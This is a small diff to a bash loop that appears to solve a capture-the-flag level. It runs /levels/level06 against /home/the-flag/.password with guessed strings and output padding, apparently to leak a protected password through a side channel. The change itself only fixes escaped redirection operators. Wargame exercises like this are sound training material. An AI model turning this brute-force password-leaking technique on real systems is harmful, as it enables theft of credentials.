@@ -20,7 +20,7 @@ while true; do
     echo "${t}"
 
     ruby -e "print 'A' * (1024-33-${#t}+3)" > f;
-    /levels/level06 /home/the-flag/.password "${t}" 2&gt;&gt;f 1&gt;o;
+    /levels/level06 /home/the-flag/.password "${t}" 2>>f 1>o;
 
     sleep 0.1 # INCREASE LIBERALLY IF FALSE POSITIVES
    
